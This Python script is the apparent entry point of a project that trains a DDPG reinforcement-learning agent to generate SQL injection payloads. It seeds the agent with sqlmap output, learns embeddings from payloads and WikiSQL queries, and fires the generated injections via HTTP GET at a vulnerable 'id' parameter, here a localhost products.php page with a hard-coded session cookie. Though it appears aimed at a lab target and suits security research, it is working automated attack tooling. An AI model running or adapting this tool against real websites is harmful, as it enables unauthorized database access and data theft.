#!/usr/local/bin/python
import sys
import numpy as np
import requests
from sql_parser.wikisql_parser import WikiSQLParser
from sqlmap_runner import SqlmapRunner
from sql_parser.token_parser import TokenParser
from sql_parser.sql_data_service import SQLDataService
from model.token_embedder import TokenEmbedder 
from model.ddpg import DDPG
from model.environment import Environment
from model.payload_builder import PayloadBuilder
from model.ddpg_hyperparameters import DDPGHyperparameters

import sql_parser.schema_parser as schema_parser

# TODO: Use argparse instead.
args = sys.argv[1:]

run_sqlmap = '--no-run-sqlmap' not in args
record_demonstrations = '--no-demonstrations' not in args
use_cache = '--from-cache' in args

embedding_data_rows = None

try:
    for arg in args:
        if arg.startswith('--embedding-dataset-count='):
            embedding_data_rows = int(arg.split('--embedding-dataset-count=')[1])
            break
except:
    pass

#
#
# !
# ! TODO: IMPORTANT: Add legal disclaimer.
# !
#
#

BATCH_SIZE = 1

EMBEDDING_DIM = 128

ACTION_SIZE = 10

# TODO: Ensure states does not need to be larger than action size.
#
# NOTE: Must be divisible by 2.
#
# This is the case because an entire action is currently set as
# the prefix of a state.
STATE_SIZE = ACTION_SIZE * 2

OPEN_URL = 'http://localhost/products.php?id='

HEADERS = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0'}
COOKIE = 'pma_lang=en; PHPSESSID=03e357607a8c75fa099da71f72d3e333; {flag}=795c7a7a5ec6b460ec00c5841019b9e9'

# Skips lowercase alphabet as SQL is case-insensitive.
visible_uppercase_chars = [chr(i) for i in range(32, 97)] + \
    [chr(i) for i in range(123, 127)]

sqlmap = SqlmapRunner(OPEN_URL, vulernable_param='id', default_vulnerable_param_value='1')

if run_sqlmap:
    print('Running sqlmap...')
    sqlmap.run(HEADERS, COOKIE)
    print('Attempted payloads gathered from sqlmap.')
else:
    print('Skipping running sqlmap...')

data_service = SQLDataService()

schema = data_service.load_schema()

columns = schema_parser.get_column_tokens_from_schema(schema)
tables = schema_parser.get_table_tokens_from_schema(schema)

sql_tokens = data_service.load_sql_tokens()
token_blacklist = data_service.load_sql_blacklist()

payloads = data_service.load_payload_files(sqlmap.domain_name)

dictionary = sql_tokens + tables + columns + visible_uppercase_chars + ['']

# Remove duplicate characters. For example, visible_uppercase_chars might contain '(',
# which may also be contained in sql_tokens.
dictionary = list(set(dictionary))

dictionary.sort(reverse=True)

token_parser = TokenParser(dictionary, token_blacklist)

if use_cache:
    print('Using cached embeddings...')
    embeddings = data_service.load_embeddings()
else:
    queries = data_service.load_wikisql_queries()

    parser = WikiSQLParser(schema)
    queries = parser.generate_randomised_examples(queries)

    data_service.save_parsed_wikisql_queries(queries)

    # Prioritise payloads over queries if the full dataset is not used for embeddings.
    embedding_training_data = payloads + queries
    embedding_training_data = embedding_training_data if embedding_data_rows is None else embedding_training_data[:embedding_data_rows]

    print('Encoding SQL fragment(s) for embeddings...')
    embedding_training_data = token_parser.parse(embedding_training_data)
    print(f'{len(embedding_training_data)} fragment(s) encoded.')

    # TODO: Retrieve cached embeddings (if already generated) if dictionary and
    # embedding examples are unchanged.
    print('Running token embedder...')
    embeddings = TokenEmbedder(EMBEDDING_DIM).learn_embeddings(embedding_training_data, len(dictionary))
    print('Embeddings learned.')

    data_service.save_embeddings(embeddings.numpy().tolist())

headers = HEADERS.copy()
headers.update({'cookie': COOKIE})

payload_builder = PayloadBuilder(dictionary, '\'', '--')

if record_demonstrations:
    print('Filtering unformatted payloads...')
    encoded_payloads = token_parser.parse(payloads, required_prefix=payload_builder.prefix, required_suffix=payload_builder.suffix)
    print('Payloads filtered.')
else:
    encoded_payloads = []

environment = Environment(
    payload_builder=payload_builder,
    action_size=ACTION_SIZE,
    state_size=STATE_SIZE,
    batch_size=BATCH_SIZE,
    embeddings=embeddings,
    columns=columns,
    tables=tables,
    send_request_callback= lambda payload:
        requests.get(OPEN_URL + payload, headers=headers))
                                         
state: np.ndarray

def print_decoded_injections():
    '''
    Use to verify that the predefined encoded injection list is correctly
    encoded.
    '''
    for injection in encoded_payloads:
        decoded = [dictionary[i] for i in injection]
        print(''.join(decoded))

def main():
    params = DDPGHyperparameters(
        gamma=0.9,
        tau=0.005,
        actor_learning_rate=0.0025,
        critic_learning_rate=0.005,
        embedding_size=EMBEDDING_DIM,
        buffer_size=1000000,
        batch_size=BATCH_SIZE,
        alpha_scalar=1.01,
        starting_adaptive_sigma=0.6,
        starting_adaptive_delta=0.6,
        psi=0.9,
        action_size=ACTION_SIZE,
        state_size=STATE_SIZE,
        prefix=payload_builder.prefix,
        suffix=payload_builder.suffix,
    )

    ddpg = DDPG(
        environment,
        encoded_payloads=encoded_payloads,
        params=params
    )

    print('Running DDPG...')

    ddpg.run(run_demonstrations=record_demonstrations)

if __name__ == '__main__':
    main()